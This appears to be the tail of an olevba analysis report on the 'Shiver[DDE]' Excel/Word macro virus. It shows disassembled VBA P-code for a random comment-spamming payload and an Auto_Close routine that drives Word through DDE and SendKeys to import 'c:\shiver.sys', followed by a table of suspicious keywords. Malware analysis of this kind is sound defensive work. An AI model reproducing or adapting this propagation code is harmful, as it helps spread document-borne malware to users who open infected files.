' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #215:
' 	EndIfBlock 
' Line #216:
' 	EndSub 
' Line #217:
' Line #218:
' 	FuncDefn (Sub xlTrigger())
' Line #219:
' 	OnError (Resume Next) 
' Line #220:
' 	ArgsCall Read 0x0000 
' Line #221:
' 	Ld xlDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #222:
' 	Ld Rnd 
' 	LitDI2 0x0320 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0259 
' 	Eq 
' 	IfBlock 
' Line #223:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #224:
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x000C 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Ld x 
' 	Concat 
' 	St RR 
' Line #225:
' 	Ld RR 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall AddComment 0x0000 
' Line #226:
' 	LitVarSpecial (True)
' 	Ld RR 
' 	ArgsLd Range 0x0001 
' 	MemLd Comment 
' 	MemSt Visible 
' Line #227:
' 	LitStr 0x0016 "Shiver[DDE] by ALT-F11"
' 	ParamNamed Then 
' 	Ld RR 
' 	ArgsLd Range 0x0001 
' 	MemLd Comment 
' 	ArgsMemCall Then 0x0001 
' Line #228:
' 	LitVarSpecial (True)
' 	Ld RR 
' 	ArgsLd Range 0x0001 
' 	MemLd Comment 
' 	MemLd Shape 
' 	ArgsMemCall Set 0x0001 
' Line #229:
' 	Ld Rnd 
' 	LitDI2 0x012C 
' 	Mul 
' 	FnInt 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall IncrementLeft 0x0001 
' Line #230:
' 	Ld Rnd 
' 	LitDI2 0x012C 
' 	Mul 
' 	FnInt 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall IncrementTop 0x0001 
' Line #231:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #232:
' 	EndIfBlock 
' Line #233:
' 	EndSub 
' Line #234:
' Line #235:
' Line #236:
' 	FuncDefn (Sub Auto_Close())
' Line #237:
' Line #238:
' 	OnError out 
' Line #239:
' Line #240:
' 	ArgsCall (Call) CheckMarker 0x0000 
' Line #241:
' Line #242:
' 	LitStr 0x0007 "OpusApp"
' 	ArgsLd FindApp 0x0001 
' 	St hWnd 
' Line #243:
' Line #244:
' 	Ld hWnd 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St WordFound 
' 	EndIf 
' Line #245:
' Line #246:
' 	Ld WordFound 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld Marker 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #247:
' Line #248:
' 	Ld Application 
' 	MemLd Path 
' 	LitStr 0x000C "\winword.exe"
' 	Concat 
' 	Ld vbMinimizedFocus 
' 	ArgsCall Shell 0x0002 
' Line #249:
' 	LitStr 0x0006 "MSWord"
' 	LitStr 0x0006 "system"
' 	Ld Application 
' 	ArgsMemLd DDEInitiate 0x0002 
' 	St CNL 
' Line #250:
' 	Ld CNL 
' 	LitStr 0x000B "[fileclose]"
' 	Ld Application 
' 	ArgsMemCall DDEExecute 0x0002 
' Line #251:
' 	Ld CNL 
' 	LitStr 0x0013 "[Sendkeys "%{F11}"]"
' 	Ld Application 
' 	ArgsMemCall DDEExecute 0x0002 
' Line #252:
' 	Ld CNL 
' 	LitStr 0x000F "[Sendkeys "^m"]"
' 	Ld Application 
' 	ArgsMemCall DDEExecute 0x0002 
' Line #253:
' 	ArgsCall (Call) delay 0x0000 
' Line #254:
' 	LitStr 0x000D "c:\shiver.sys"
' 	Ld Wait 
' 	ArgsCall SendKeys 0x0002 
' Line #255:
' 	LitStr 0x0002 "%o"
' 	ArgsCall SendKeys 0x0001 
' Line #256:
' 	Ld CNL 
' 	LitStr 0x0012 "[Sendkeys "%{F4}"]"
' 	Ld Application 
' 	ArgsMemCall DDEExecute 0x0002 
' Line #257:
' 	Ld CNL 
' 	LitStr 0x0012 "[Sendkeys "%{F4}"]"
' 	Ld Application 
' 	ArgsMemCall DDEExecute 0x0002 
' Line #258:
' 	Ld CNL 
' 	LitStr 0x000E "[Sendkeys "y"]"
' 	Ld Application 
' 	ArgsMemCall DDEExecute 0x0002 
' Line #259:
' 	Ld CNL 
' 	Ld Application 
' 	ArgsMemCall DDETerminate 0x0001 
' Line #260:
' Line #261:
' 	ArgsCall (Call) MakeMarker 0x0000 
' Line #262:
' Line #263:
' 	EndIfBlock 
' Line #264:
' Line #265:
' 	Label out 
' Line #266:
' Line #267:
' 	EndSub 
' Line #268:
' Line #269:
' 	FuncDefn (Sub delay())
' Line #270:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Hour 0x0001 
' 	St newHour 
' Line #271:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Minute 0x0001 
' 	St newMinute 
' Line #272:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Second 0x0001 
' 	LitDI2 0x0002 
' 	Add 
' 	St newSecond 
' Line #273:
' 	Ld newHour 
' 	Ld newMinute 
' 	Ld newSecond 
' 	ArgsLd TimeSerial 0x0003 
' 	St waitTime 
' Line #274:
' 	Ld waitTime 
' 	Ld Application 
' 	ArgsMemCall Wait 0x0001 
' Line #275:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbMinimizedFocus    |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|FindWindow          |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Sendkeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |Excel.exe           |Executable file name                         |
|IOC       |winword.exe         |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

